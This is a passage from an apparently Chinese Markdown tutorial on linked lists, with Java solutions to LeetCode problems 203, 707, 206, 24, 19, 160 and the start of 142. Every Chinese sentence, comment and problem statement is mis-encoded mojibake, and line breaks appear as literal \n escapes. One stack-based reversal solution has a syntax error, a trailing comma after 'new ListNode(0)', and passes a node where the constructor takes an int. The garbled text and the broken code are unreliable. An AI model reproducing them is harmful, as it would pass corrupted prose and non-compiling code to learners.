name=å®‹æ±Ÿ}\nHeroNode{id=2, name=å¢ä¿Šä¹‰}\nHeroNode{id=3, name=å´ç”¨}\nHeroNode{id=4, name=å…¬å­™èƒœ}\nåˆ é™¤èŠ‚ç‚¹3\nHeroNode{id=1, name=å®‹æ±Ÿ}\nHeroNode{id=2, name=å¢ä¿Šä¹‰}\nHeroNode{id=4, name=å…¬å­™èƒœ}\næµ‹è¯•æœ‰åºå¢åŠ é“¾è¡¨ï¼š\nè‹±é›„ç¼–å·ã€2ã€‘å·²ç»å­˜åœ¨äº†\nè‹±é›„ç¼–å·ã€4ã€‘å·²ç»å­˜åœ¨äº†\nè‹±é›„ç¼–å·ã€2ã€‘å·²ç»å­˜åœ¨äº†\nHeroNode{id=1, name=å®‹æ±Ÿ}\nHeroNode{id=2, name=å¢ä¿Šä¹‰}\nHeroNode{id=3, name=å´ç”¨}\nHeroNode{id=4, name=å…¬å­™èƒœ}\n```\n\n### â¸å¾ªç¯é“¾è¡¨\n\n\n\n### â¹LeetCodeçœŸé¢˜\n\n#### [203. ç§»é™¤é“¾è¡¨å…ƒç´ ](https://leetcode.cn/problems/remove-linked-list-elements/)\n\nç»™ä½ ä¸€ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹ `head` å’Œä¸€ä¸ªæ•´æ•° `val` ï¼Œè¯·ä½ åˆ é™¤é“¾è¡¨ä¸­æ‰€æœ‰æ»¡è¶³ `Node.val == val` çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å› **æ–°çš„å¤´èŠ‚ç‚¹** ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1,2,6,3,4,5,6], val = 6\nè¾“å‡ºï¼š[1,2,3,4,5]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [], val = 1\nè¾“å‡ºï¼š[]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [7,7,7,7], val = 7\nè¾“å‡ºï¼š[]\n```\n\n\n\n```java\n/**\n * æ·»åŠ è™šèŠ‚ç‚¹æ–¹å¼\n * æ—¶é—´å¤æ‚åº¦ O(n)\n * ç©ºé—´å¤æ‚åº¦ O(1)\n */\npublic ListNode removeElements(ListNode head, int val) {\n    if (head == null) {\n        return head;\n    }\n    // å› ä¸ºåˆ é™¤å¯èƒ½æ¶‰åŠåˆ°å¤´èŠ‚ç‚¹ï¼Œæ‰€ä»¥è®¾ç½®dummyèŠ‚ç‚¹ï¼Œç»Ÿä¸€æ“ä½œ\n    ListNode dummy = new ListNode(-1, head);\n    ListNode pre = dummy;\n    ListNode cur = head;\n    while (cur != null) {\n        if (cur.val == val) {\n            pre.next = cur.next;\n        } else {\n            pre = cur;\n        }\n        cur = cur.next;\n    }\n    return dummy.next;\n}\n\n\n\n/**\n * ä¸æ·»åŠ è™šæ‹ŸèŠ‚ç‚¹and pre Nodeæ–¹å¼\n * æ—¶é—´å¤æ‚åº¦ O(n)\n * ç©ºé—´å¤æ‚åº¦ O(1)\n */\nclass Solution {\n    public ListNode removeElements(ListNode head, int val) {\n       //å»é™¤å¼€å¤´èŠ‚ç‚¹\n        while(head != null && head.val == val){\n            head = head.next;\n        }\n        ListNode cur = head;\n        while(cur != null){\n            while(cur.next != null && cur.next.val == val){\n                cur.next = cur.next.next;\n            }\n            cur = cur.next;\n        }\n        return head;\n    }\n}\n```\n\n#### [707. è®¾è®¡é“¾è¡¨](https://leetcode.cn/problems/design-linked-list/)\n\nè®¾è®¡é“¾è¡¨çš„å®ç°ã€‚æ‚¨å¯ä»¥é€‰æ‹©ä½¿ç”¨å•é“¾è¡¨æˆ–åŒé“¾è¡¨ã€‚å•é“¾è¡¨ä¸­çš„èŠ‚ç‚¹åº”è¯¥å…·æœ‰ä¸¤ä¸ªå±æ€§ï¼š`val` å’Œ `next`ã€‚`val` æ˜¯å½“å‰èŠ‚ç‚¹çš„å€¼ï¼Œ`next` æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ/å¼•ç”¨ã€‚å¦‚æœè¦ä½¿ç”¨åŒå‘é“¾è¡¨ï¼Œåˆ™è¿˜éœ€è¦ä¸€ä¸ªå±æ€§ `prev` ä»¥æŒ‡ç¤ºé“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹ã€‚å‡è®¾é“¾è¡¨ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯ 0-index çš„ã€‚\n\nåœ¨é“¾è¡¨ç±»ä¸­å®ç°è¿™äº›åŠŸèƒ½ï¼š\n\n-   get(index)ï¼šè·å–é“¾è¡¨ä¸­ç¬¬ `index` ä¸ªèŠ‚ç‚¹çš„å€¼ã€‚å¦‚æœç´¢å¼•æ— æ•ˆï¼Œåˆ™è¿”å›`-1`ã€‚\n-   addAtHead(val)ï¼šåœ¨é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰æ·»åŠ ä¸€ä¸ªå€¼ä¸º `val` çš„èŠ‚ç‚¹ã€‚æ’å…¥åï¼Œæ–°èŠ‚ç‚¹å°†æˆä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n-   addAtTail(val)ï¼šå°†å€¼ä¸º `val` çš„èŠ‚ç‚¹è¿½åŠ åˆ°é“¾è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚\n-   addAtIndex(index,val)ï¼šåœ¨é“¾è¡¨ä¸­çš„ç¬¬ `index` ä¸ªèŠ‚ç‚¹ä¹‹å‰æ·»åŠ å€¼ä¸º `val`  çš„èŠ‚ç‚¹ã€‚å¦‚æœ `index` ç­‰äºé“¾è¡¨çš„é•¿åº¦ï¼Œåˆ™è¯¥èŠ‚ç‚¹å°†é™„åŠ åˆ°é“¾è¡¨çš„æœ«å°¾ã€‚å¦‚æœ `index` å¤§äºé“¾è¡¨é•¿åº¦ï¼Œåˆ™ä¸ä¼šæ’å…¥èŠ‚ç‚¹ã€‚å¦‚æœ`index`å°äº0ï¼Œåˆ™åœ¨å¤´éƒ¨æ’å…¥èŠ‚ç‚¹ã€‚\n-   deleteAtIndex(index)ï¼šå¦‚æœç´¢å¼• `index` æœ‰æ•ˆï¼Œåˆ™åˆ é™¤é“¾è¡¨ä¸­çš„ç¬¬ `index` ä¸ªèŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ï¼š**\n\n```\nMyLinkedList linkedList = new MyLinkedList();\nlinkedList.addAtHead(1);\nlinkedList.addAtTail(3);\nlinkedList.addAtIndex(1,2);   //é“¾è¡¨å˜ä¸º1-> 2-> 3\nlinkedList.get(1);            //è¿”å›2\nlinkedList.deleteAtIndex(1);  //ç°åœ¨é“¾è¡¨æ˜¯1-> 3\nlinkedList.get(1);            //è¿”å›3\n```\n\n\n\n```java\n/**\n* å•é“¾è¡¨\n*/\nclass ListNode {\n    int val;\n    ListNode next;\n    ListNode(){}\n    ListNode(int val) {\n        this.val=val;\n    }\n}\n\nclass MyLinkedList {\n\n    //sizeå­˜å‚¨é“¾è¡¨å…ƒç´ çš„ä¸ªæ•°\n    int size;\n    //è™šæ‹Ÿå¤´ç»“ç‚¹\n    ListNode head;\n\n    public MyLinkedList() {\n        size = 0;\n        head = new ListNode(0);\n    }\n    \n    public int get(int index) {\n        if(index < 0 || index >= size) return -1;\n        ListNode cur = head;\n        //åŒ…å«ä¸€ä¸ªè™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼Œæ‰€ä»¥æŸ¥æ‰¾ç¬¬ index+1 ä¸ªèŠ‚ç‚¹\n        for(int i = 0; i <= index; i++){\n            cur = cur.next;\n        }\n        return cur.val;\n    }\n    \n    public void addAtHead(int val) {\n         addAtIndex(0, val);\n    }\n    \n    public void addAtTail(int val) {\n        addAtIndex(size, val);\n    }\n    \n    public void addAtIndex(int index, int val) {\n        if(index > size) return;\n        if(index < 0) index = 0;\n        ListNode pre = head;\n        ListNode addNode = new ListNode(val);\n        //æ‰¾åˆ°è¦æ’å…¥èŠ‚ç‚¹çš„å‰é©±\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        addNode.next = pre.next;\n        pre.next = addNode;\n        size++;\n    }\n    \n\n    public void deleteAtIndex(int index) {\n        if (index < 0 || index >= size) return;\n        ListNode pre = head;\n        //æ‰¾åˆ°è¦åˆ é™¤èŠ‚ç‚¹çš„å‰é©±\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        pre.next = pre.next.next;\n        size--;\n    }\n}\n\n\n/**\n*åŒé“¾è¡¨\n*/\nclass ListNode {\n    int val;\n    ListNode prev, next;\n    ListNode(){}\n    ListNode(int val) {\n        this.val=val;\n    }\n}\n\nclass MyLinkedList {\n\n    //sizeå­˜å‚¨é“¾è¡¨å…ƒç´ çš„ä¸ªæ•°\n    int size;\n    //è™šæ‹Ÿå¤´ç»“ç‚¹\n    ListNode head, tail;\n\n    public MyLinkedList() {\n        size = 0;\n        head = new ListNode(0);\n        tail = new ListNode(0);\n        //è¿™ä¸€æ­¥éå¸¸å…³é”®ï¼Œå¦åˆ™åœ¨åŠ å…¥å¤´ç»“ç‚¹çš„æ“ä½œä¸­ä¼šå‡ºç°null.nextçš„é”™è¯¯ï¼ï¼ï¼\n        head.next=tail;\n        tail.prev=head;\n    }\n    \n    public int get(int index) {\n        //åˆ¤æ–­indexæ˜¯å¦æœ‰æ•ˆ\n        if(index < 0 || index >= size) return -1;\n        ListNode cur = head;\n        //åˆ¤æ–­æ˜¯å“ªä¸€è¾¹éå†æ—¶é—´æ›´çŸ­\n        if(index > size / 2) {\n            cur = tail;\n            for(int i = size; i > index; i--){\n                cur = cur.prev;\n            }\n        } else {\n            //åŒ…å«ä¸€ä¸ªè™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼Œæ‰€ä»¥æŸ¥æ‰¾ç¬¬ index+1 ä¸ªèŠ‚ç‚¹\n            for(int i = 0; i <= index; i++){\n                cur = cur.next;\n            }\n        }\n        return cur.val;\n    }\n    \n    public void addAtHead(int val) {\n         addAtIndex(0, val);\n    }\n    \n    public void addAtTail(int val) {\n        addAtIndex(size, val);\n    }\n    \n    public void addAtIndex(int index, int val) {\n        if(index > size) return;\n        if(index < 0) index = 0;\n        //æ‰¾åˆ°å‰é©±\n        ListNode pre = head;\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        //æ–°å»ºç»“ç‚¹\n        ListNode newNode = new ListNode(val);\n        //æ’å…¥èŠ‚ç‚¹\n        newNode.next = pre.next;\n        pre.next.prev = newNode;\n        newNode.prev = pre; \n        pre.next = newNode;\n        size++;//èŠ‚ç‚¹æ•°+1\n    }\n    \n\n    public void deleteAtIndex(int index) {\n        if (index < 0 || index >= size) {\n            return;\n        }\n        ListNode pre = head;\n        //æ‰¾åˆ°è¦åˆ é™¤èŠ‚ç‚¹çš„å‰é©±\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        pre.next.next.prev = pre;\n        pre.next = pre.next.next;\n        \n        size--;\n    }\n}\n```\n\n#### [206. åè½¬é“¾è¡¨ ](https://leetcode.cn/problems/reverse-linked-list/)\n\nç»™ä½ å•é“¾è¡¨çš„å¤´èŠ‚ç‚¹ `head` ï¼Œè¯·ä½ åè½¬é“¾è¡¨ï¼Œå¹¶è¿”å›åè½¬åçš„é“¾è¡¨ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex1.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2,3,4,5]\nè¾“å‡ºï¼š[5,4,3,2,1]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex2.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2]\nè¾“å‡ºï¼š[2,1]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = []\nè¾“å‡ºï¼š[]\n```\n\n**è¿›é˜¶ï¼š**é“¾è¡¨å¯ä»¥é€‰ç”¨è¿­ä»£æˆ–é€’å½’æ–¹å¼å®Œæˆåè½¬ã€‚ä½ èƒ½å¦ç”¨ä¸¤ç§æ–¹æ³•è§£å†³è¿™é“é¢˜ï¼Ÿ\n\n```java\n//è¿­ä»£æ³•ï¼ˆåŒæŒ‡é’ˆæ³•ï¼‰\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null;\n        ListNode cur = head;\n        ListNode tmp = null;\n        while(cur != null){\n            tmp = cur.next;\n            cur.next = pre;\n            pre = cur;\n            cur = tmp;\n        }\n        return pre;\n    }\n}\n\n// é€’å½’æ³•\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        return reverse(null,head);\n    }\n    public ListNode reverse(ListNode pre, ListNode cur){\n        if (cur == null) {\n            return pre;\n        }\n        ListNode tmp = null;\n        tmp = cur.next;\n        cur.next = pre;\n        return reverse(cur,tmp);\n    }\n}\n\n//æ ˆå®ç°1(ä¸æ¨èï¼Œæ•ˆç‡ä¸é«˜)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0);\n        ListNode temp = dummy;\n        while(!stack.isEmpty()){\n            temp.next = stack.pop();\n            temp = temp.next;\n        }\n        temp.next = null; //æœ€åèŠ‚ç‚¹ä¸æ¥nullä¼šå½¢æˆç¯é“¾\n        return dummy.next;\n    }\n}\n//æ ˆå®ç°2(ä¸æ¨èï¼Œæ•ˆç‡ä¸é«˜)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.add(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0),\n        ListNode temp = dummy;\n        while(stack.size() != 0){\n            temp.next = new ListNode(stack.pop());//é˜²æ­¢å½¢æˆç¯é“¾\n            temp = temp.next;\n        }\n        return dummy.next;\n    }\n}\n\n```\n\n#### [24. ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹](https://leetcode.cn/problems/swap-nodes-in-pairs/)\n\nç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œä¸¤ä¸¤äº¤æ¢å…¶ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›äº¤æ¢åé“¾è¡¨çš„å¤´èŠ‚ç‚¹ã€‚ä½ å¿…é¡»åœ¨ä¸ä¿®æ”¹èŠ‚ç‚¹å†…éƒ¨çš„å€¼çš„æƒ…å†µä¸‹å®Œæˆæœ¬é¢˜ï¼ˆå³ï¼Œåªèƒ½è¿›è¡ŒèŠ‚ç‚¹äº¤æ¢ï¼‰ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/swap_ex1.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2,3,4]\nè¾“å‡ºï¼š[2,1,4,3]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šhead = []\nè¾“å‡ºï¼š[]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1]\nè¾“å‡ºï¼š[1]\n```\n\n**é€’å½’æ³•ï¼šO(n)**\n\n- 1.è¿”å›å€¼ï¼šäº¤æ¢å®Œæˆçš„å­é“¾è¡¨\n- 2.è°ƒæ¢ï¼šè®¾éœ€è¦äº¤æ¢çš„ä¸¤ä¸ªç‚¹ä¸º first å’Œ secondï¼Œfirst è¿æ¥åé¢äº¤æ¢å®Œæˆçš„å­é“¾è¡¨ï¼Œsecond è¿æ¥ first\n- 3.ç»ˆæ­¢æ¡ä»¶ï¼šhead ä¸ºç©ºæŒ‡é’ˆæˆ–è€… next ä¸ºç©ºæŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯å½“å‰æ— èŠ‚ç‚¹æˆ–è€…åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— æ³•è¿›è¡Œäº¤æ¢\n\n```java\nclass Solution {\n    public ListNode swapPairs(ListNode head) {\n        if(head == null || head.next == null){\n            return head;\n        }\n        ListNode first = head;\n        ListNode second = head.next;\n        first.next = swapPairs(second.next);\n        second.next = first;\n        return second;\n    }\n}\n```\n\n**è¿­ä»£æ³•ï¼šO(n)**\n\n| ![](https://img.jwt1399.top/img/202210251202982.png) | ![](https://img.jwt1399.top/img/202210251202275.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\nclass Solution {\n    public ListNode swapPairs(ListNode head) {\n        ListNode dummyHead = new ListNode(0,head); //è™šæ‹Ÿå¤´èŠ‚ç‚¹\n        ListNode temp = dummyHead;\n        while (temp.next != null && temp.next.next != null) {\n            ListNode node1 = temp.next;\n            ListNode node2 = temp.next.next;\n            temp.next = node2;         //æ­¥éª¤ä¸€\n            node1.next = node2.next;  //æ­¥éª¤äºŒ\n            node2.next = node1; \t\t\t//æ­¥éª¤ä¸‰\n            temp = node1; //åç§»ä¸¤ä½ï¼Œå‡†å¤‡ä¸‹ä¸€è½®äº¤æ¢\n        }\n        return dummyHead.next;\n    }\n}\n```\n\n#### [19. åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹](https://leetcode.cn/problems/remove-nth-node-from-end-of-list/)\n\nç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œåˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ `n` ä¸ªç»“ç‚¹ï¼Œå¹¶ä¸”è¿”å›é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/remove_ex1.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2,3,4,5], n = 2\nè¾“å‡ºï¼š[1,2,3,5]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1], n = 1\nè¾“å‡ºï¼š[]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = [1,2], n = 1\nè¾“å‡ºï¼š[1]\n```\n**æš´åŠ›æ³•ï¼šO(n)**\n\n```java\nclass Solution {\n    public ListNode removeNthFromEnd(ListNode head, int n) {\n        //è®¡ç®—é“¾è¡¨é•¿åº¦\n        int length = 0;\n        ListNode temp = head;\n        while (temp != null) {\n            ++length;\n            temp = temp.next;\n        }\n        //åˆ é™¤èŠ‚ç‚¹\n        ListNode dummy = new ListNode(0, head);\n        ListNode cur = dummy;\n        for (int i = 0; i < length - n; i++) {\n            cur = cur.next;\n        }\n        cur.next = cur.next.next;\n        return dummy.next;\n    }\n}\n```\n\n**åŒæŒ‡é’ˆæ³•ï¼šO(n)**\n\nç”±äºæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å€’æ•°ç¬¬ n ä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆ first å’Œ second åŒæ—¶å¯¹é“¾è¡¨è¿›è¡Œéå†ï¼Œå¹¶ä¸” firstæ¯” secondè¶…å‰ n ä¸ªèŠ‚ç‚¹ã€‚å½“ first éå†åˆ°é“¾è¡¨çš„æœ«å°¾æ—¶ï¼Œsecond å°±æ°å¥½å¤„äºå€’æ•°ç¬¬ n ä¸ªèŠ‚ç‚¹ã€‚\n\nå…·ä½“åœ°ï¼Œåˆå§‹æ—¶ firstå’Œ second å‡æŒ‡å‘å¤´èŠ‚ç‚¹ã€‚æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ first å¯¹é“¾è¡¨è¿›è¡Œéå†ï¼Œéå†çš„æ¬¡æ•°ä¸º nã€‚æ­¤æ—¶ first æ¯” second è¶…å‰äº† n ä¸ªèŠ‚ç‚¹ã€‚åœ¨è¿™ä¹‹åï¼ŒåŒæ—¶ä½¿ç”¨ first å’Œ second å¯¹é“¾è¡¨è¿›è¡Œéå†ã€‚å½“ first éå†åˆ°é“¾è¡¨çš„æœ«å°¾ï¼ˆå³ firstä¸ºç©ºæŒ‡é’ˆï¼‰æ—¶ï¼Œsecond æ°å¥½æŒ‡å‘å€’æ•°ç¬¬ n ä¸ªèŠ‚ç‚¹ã€‚\n\n```java\nclass Solution {\n    public ListNode removeNthFromEnd(ListNode head, int n) {\n        ListNode dummy = new ListNode(0, head);\n        ListNode first = head;\n        ListNode second = dummy;\n        for (int i = 0; i < n; i++) {\n            first = first.next;\n        }\n        while (first != null) {\n            first = first.next;\n            second = second.next;\n        }\n        second.next = second.next.next;\n        return dummy.next;\n    }\n}\n```\n\n#### [160. ç›¸äº¤é“¾è¡¨](https://leetcode.cn/problems/intersection-of-two-linked-lists/)\n\nç»™ä½ ä¸¤ä¸ªå•é“¾è¡¨çš„å¤´èŠ‚ç‚¹ `headA` å’Œ `headB` ï¼Œè¯·ä½ æ‰¾å‡ºå¹¶è¿”å›ä¸¤ä¸ªå•é“¾è¡¨ç›¸äº¤çš„èµ·å§‹èŠ‚ç‚¹ã€‚å¦‚æœä¸¤ä¸ªé“¾è¡¨ä¸å­˜åœ¨ç›¸äº¤èŠ‚ç‚¹ï¼Œè¿”å› `null` ã€‚\n\nå›¾ç¤ºä¸¤ä¸ªé“¾è¡¨åœ¨èŠ‚ç‚¹ `c1` å¼€å§‹ç›¸äº¤**ï¼š**\n\n[![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png)](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png)\n\né¢˜ç›®æ•°æ® **ä¿è¯** æ•´ä¸ªé“¾å¼ç»“æ„ä¸­ä¸å­˜åœ¨ç¯ã€‚\n\n**æ³¨æ„**ï¼Œå‡½æ•°è¿”å›ç»“æœåï¼Œé“¾è¡¨å¿…é¡» **ä¿æŒå…¶åŸå§‹ç»“æ„** ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n[![](https://assets.leetcode.com/uploads/2021/03/05/160_example_1_1.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_1.png)\n\n```\nè¾“å…¥ï¼šintersectVal = 8, listA = [4,1,8,4,5], listB = [5,6,1,8,4,5], skipA = 2, skipB = 3\nè¾“å‡ºï¼šIntersected at '8'\nè§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 8 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªé“¾è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚\nä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [4,1,8,4,5]ï¼Œé“¾è¡¨ B ä¸º [5,6,1,8,4,5]ã€‚\nåœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 2 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ã€‚\nâ€” è¯·æ³¨æ„ç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸ä¸º 1ï¼Œå› ä¸ºåœ¨é“¾è¡¨ A å’Œé“¾è¡¨ B ä¹‹ä¸­å€¼ä¸º 1 çš„èŠ‚ç‚¹ (A ä¸­ç¬¬äºŒä¸ªèŠ‚ç‚¹å’Œ B ä¸­ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹) æ˜¯ä¸åŒçš„èŠ‚ç‚¹ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒä»¬åœ¨å†…å­˜ä¸­æŒ‡å‘ä¸¤ä¸ªä¸åŒçš„ä½ç½®ï¼Œè€Œé“¾è¡¨ A å’Œé“¾è¡¨ B ä¸­å€¼ä¸º 8 çš„èŠ‚ç‚¹ (A ä¸­ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ï¼ŒB ä¸­ç¬¬å››ä¸ªèŠ‚ç‚¹) åœ¨å†…å­˜ä¸­æŒ‡å‘ç›¸åŒçš„ä½ç½®ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n[![](https://assets.leetcode.com/uploads/2021/03/05/160_example_2.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_2.png)\n\n```\nè¾“å…¥ï¼šintersectVal = 2, listA = [1,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\nè¾“å‡ºï¼šIntersected at '2'\nè§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 2 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªé“¾è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚\nä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [1,9,1,2,4]ï¼Œé“¾è¡¨ B ä¸º [3,2,4]ã€‚\nåœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 1 ä¸ªèŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n[![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_example_3.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_3.png)\n\n```\nè¾“å…¥ï¼šintersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\nè¾“å‡ºï¼šnull\nè§£é‡Šï¼šä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [2,6,4]ï¼Œé“¾è¡¨ B ä¸º [1,5]ã€‚\nç”±äºè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œæ‰€ä»¥ intersectVal å¿…é¡»ä¸º 0ï¼Œè€Œ skipA å’Œ skipB å¯ä»¥æ˜¯ä»»æ„å€¼ã€‚\nè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œå› æ­¤è¿”å› null ã€‚\n```\n\n**è¿›é˜¶ï¼š**ä½ èƒ½å¦è®¾è®¡ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦ `O(m + n)` ã€ä»…ç”¨ `O(1)` å†…å­˜çš„è§£å†³æ–¹æ¡ˆï¼Ÿ\n\nè€ƒè™‘æ„å»ºä¸¤ä¸ªèŠ‚ç‚¹æŒ‡é’ˆ `A` , `B` åˆ†åˆ«æŒ‡å‘ä¸¤é“¾è¡¨å¤´èŠ‚ç‚¹ `headA` , `headB` ï¼Œåšå¦‚ä¸‹æ“ä½œï¼š\n\n- æŒ‡é’ˆ `A` å…ˆéå†å®Œé“¾è¡¨ `headA` ï¼Œå†å¼€å§‹éå†é“¾è¡¨ `headB` ï¼Œå½“èµ°åˆ° `node` æ—¶ï¼Œå…±èµ°æ­¥æ•°ä¸ºï¼ša+(bâˆ’c)\n- æŒ‡é’ˆ `B` å…ˆéå†å®Œé“¾è¡¨ `headB` ï¼Œå†å¼€å§‹éå†é“¾è¡¨ `headA` ï¼Œå½“èµ°åˆ° `node` æ—¶ï¼Œå…±èµ°æ­¥æ•°ä¸ºï¼šb+(aâˆ’c)\n\na+(bâˆ’c) = b+(aâˆ’c)ï¼Œæ­¤æ—¶æŒ‡é’ˆ `A` , `B` é‡åˆ ï¼Œå¹¶æœ‰ä¸¤ç§æƒ…å†µï¼š\n\n1. è‹¥ä¸¤é“¾è¡¨ **æœ‰** å…¬å…±å°¾éƒ¨ (å³ c>0 ) ï¼šæŒ‡é’ˆ `A` , `B` åŒæ—¶æŒ‡å‘ã€Œç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹ã€`node` ã€‚\n2. è‹¥ä¸¤é“¾è¡¨ **æ— ** å…¬å…±å°¾éƒ¨ (å³ c=0) ï¼šæŒ‡é’ˆ `A` , `B` åŒæ—¶æŒ‡å‘ null ã€‚\n\nå› æ­¤è¿”å› `A` å³å¯ã€‚\n\n```java\npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            if(A != null) A = A.next;\n            else A = headB;\n            if(B != null) B = B.next;\n            else B = headA;\n        }\n        return A;\n    }\n}\n\n//ç®€åŒ–ä»£ç \npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            A = A != null ? A.next : headB;\n            B = B != null ? B.next : headA;\n        }\n        return A;\n    }\n}\n```\n\n#### [142. ç¯å½¢é“¾è¡¨ II ](https://leetcode.cn/problems/linked-list-cycle-ii/description/)\n\nç»™å®šä¸€ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹  `head` ï¼Œè¿”å›é“¾è¡¨å¼€å§‹å…¥ç¯çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ _å¦‚æœé“¾è¡¨æ— ç¯ï¼Œåˆ™è¿”å› 